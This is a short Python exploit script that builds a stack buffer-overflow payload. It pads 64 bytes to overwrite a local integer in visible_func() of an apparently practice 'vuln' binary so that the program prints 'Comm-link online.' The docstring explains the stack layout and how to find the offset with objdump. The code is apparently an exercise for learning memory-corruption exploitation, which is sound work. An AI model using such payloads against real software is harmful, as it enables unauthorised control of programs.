#!/usr/bin/env python3
# SPDX-License-Identifier: BSD-3-Clause
"""
Payload: overwrite local variable `s` to trigger "Comm-link online."

64-bit stack layout of visible_func() (example with typical GCC -O0):
  [rbp - 72]  buffer[64]          ← fgets writes here
  [rbp -  8]  s (unsigned int)    ← compiler pads int to 8-byte slot
  [rbp]       saved RBP  (8 B)
  [rbp + 8]   return address (8 B)

Find the exact offset on your system:
  objdump -d -Mintel vuln | grep -A40 "<visible_func>:"
  Look for: mov DWORD PTR [rbp-0x?],0x42424242   ← that is s
            lea rax,[rbp-0x?]                     ← that is &buffer[0]
  offset_to_s = buffer_rbp_offset - s_rbp_offset
"""

import os
import struct

def p64(num):
    return struct.pack("<Q", num)

# ── adjust this after reading objdump output ──────────────────────────────────
offset_to_s   = 64   # bytes from buffer[0] to s  (= buf_offset - s_offset)
value_to_write = 0x5a5a5a5a
# ─────────────────────────────────────────────────────────────────────────────

payload  = offset_to_s * b"A"
payload += struct.pack("<I", value_to_write)   # overwrite the 4-byte int s

os.write(1, payload)
